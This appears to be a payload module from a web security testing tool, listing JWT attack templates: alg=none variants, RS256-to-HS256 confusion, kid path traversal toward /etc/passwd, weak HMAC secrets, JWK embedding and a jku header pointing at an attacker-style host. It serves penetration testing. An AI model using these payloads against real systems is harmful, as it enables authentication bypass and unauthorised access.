"""JWT attack payloads — alg confusion, none alg, crafted tokens."""

NAME = "JWT Attacks"
DESCRIPTION = "JWT manipulation payloads for alg confusion, none alg, and key injection"
RISK = "MEDIUM"

PAYLOADS = [
    # These are technique descriptions, not literal payload strings.
    # Actual JWT manipulation is done by the jwt.py action module.
    # These serve as templates and test values.

    # alg=none tokens (template: replace PAYLOAD with base64-encoded payload)
    "alg:none|header:{\"alg\":\"none\",\"typ\":\"JWT\"}|body:<set PAYLOAD>",
    "alg:none|header:{\"alg\":\"None\",\"typ\":\"JWT\"}|body:<set PAYLOAD>",
    "alg:none|header:{\"alg\":\"NONE\",\"typ\":\"JWT\"}|body:<set PAYLOAD>",
    "alg:none|header:{\"alg\":\"nOnE\",\"typ\":\"JWT\"}|body:<set PAYLOAD>",
    # Alg confusion (RS256 -> HS256)
    "alg:confusion|original:RS256|attack:HS256|method:use_public_key_as_secret",
    # kid injection
    "kid:injection|header:{\"kid\":\"../../../dev/null\"}|body:<set PAYLOAD>",
    "kid:injection|header:{\"kid\":\"/dev/null\"}|body:<set PAYLOAD>",
    "kid:injection|header:{\"kid\":\"../../../../etc/passwd\"}|body:<set PAYLOAD>",
    # Weak secret test values
    "secret:test|expected:hmac_sha256_match",
    "secret:secret|expected:hmac_sha256_match",
    "secret:password|expected:hmac_sha256_match",
    "secret:123456|expected:hmac_sha256_match",
    "secret:admin|expected:hmac_sha256_match",
    # JWK injection
    "jwk:injection|method:embed_controlled_jwk_in_header",
    # JKU header injection
    "jku:injection|header:{\"jku\":\"https://evil.example.com/jwks.json\"}",
]
